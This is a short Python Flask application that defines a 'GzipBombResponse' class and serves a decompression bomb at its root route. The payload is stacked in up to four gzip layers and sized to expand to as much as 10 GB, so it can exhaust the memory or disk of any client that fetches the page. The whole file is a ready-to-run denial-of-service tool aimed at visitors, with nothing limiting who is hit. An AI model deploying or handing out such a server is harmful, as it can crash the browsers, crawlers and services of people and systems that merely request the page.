"""
"""
from flask import Response
from ._rawdata import rawdata


class GzipBombResponse(Response):
    """"""

    class _GzipData(object):
        """"""

        def __init__(self, rounds, data):
            self.rounds = rounds
            self.data = data

    _gzipData = {
        #: 1 kB
        '1k':   _GzipData(rounds=1, data=rawdata['1k']),
        #: 10 kB
        '10k':  _GzipData(rounds=1, data=rawdata['10k']),
        #: 100 kB
        '100k': _GzipData(rounds=2, data=rawdata['100k']),
        #: 1 MB
        '1M':   _GzipData(rounds=2, data=rawdata['1M']),
        #: 10 MB
        '10M':  _GzipData(rounds=2, data=rawdata['10M']),
        #: 100 MB
        '100M': _GzipData(rounds=3, data=rawdata['100M']),
        #: 1 GB
        '1G':   _GzipData(rounds=3, data=rawdata['1G']),
        #: 10 GB
        '10G':  _GzipData(rounds=4, data=rawdata['10G']),
    }

    def __init__(self, *args, **kwargs):
        """"""
        size = kwargs.pop('size', '10M')
        super(Response, self).__init__(*args, **kwargs)
        
        gzip = self._gzipData[size]
        self.data = gzip.data

        self.headers['Content-Encoding'] = ','.join(['gzip'] * gzip.rounds)
        self.headers['Content-Length']   = len(self.data)


from flask import Flask

app = Flask(__name__)

@app.route('/')
def gzipped():
    return GzipBombResponse(size='10M')


if __name__ == "__main__":
    app.run()
